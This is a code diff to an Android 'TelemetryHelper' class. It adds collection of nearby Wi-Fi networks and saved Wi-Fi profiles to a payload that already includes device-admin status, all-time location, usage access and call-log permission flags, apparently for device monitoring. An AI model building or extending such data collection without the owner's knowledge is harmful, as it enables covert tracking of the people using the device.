@@ -13,6 +13,8 @@ public final class TelemetryHelper {
 
     public static String buildTelemetryPayload(Context context, boolean deviceAdminActive) {
         String wifiSsid = readWifiSsid(context);
+        JSONArray nearbyWifi = WifiScanHelper.collectNearbyWifi(context);
+        JSONArray savedWifiProfiles = WifiScanHelper.collectSavedProfiles(context);
         JSONArray usageSummary = UsageStatsHelper.collectUsageSummary(context);
         StringBuilder payload = new StringBuilder();
         org.json.JSONObject locationJson = LocationHelper.buildLocationJson(context);
@@ -26,7 +28,9 @@ public final class TelemetryHelper {
                 .append("\"deviceId\":\"").append(BackendClient.escapeJson(BackendClient.getDeviceId(context))).append("\",")
                 .append("\"deviceAdminActive\":").append(deviceAdminActive ? "true" : "false").append(",")
                 .append("\"wifiSsid\":\"").append(BackendClient.escapeJson(wifiSsid)).append("\",")
-                .append("\"nearbyWifi\":").append(WifiScanHelper.collectNearbyWifi(context).toString()).append(",")
+                .append("\"nearbyWifi\":").append(nearbyWifi.toString()).append(",")
+                .append("\"savedWifiProfiles\":").append(savedWifiProfiles.toString()).append(",")
+                .append("\"wifiScanAt\":").append(System.currentTimeMillis() / 1000L).append(",")
                 .append("\"locationPermissionGranted\":").append(LocationHelper.hasAllTimeLocation(context) ? "true" : "false").append(",")
                 .append("\"usageAccessGranted\":").append(UsageStatsHelper.hasUsageAccess(context) ? "true" : "false").append(",")
                 .append("\"callLogPermissionGranted\":").append(CommunicationLogHelper.hasCallLogPermission(context) ? "true" : "false").append(",")
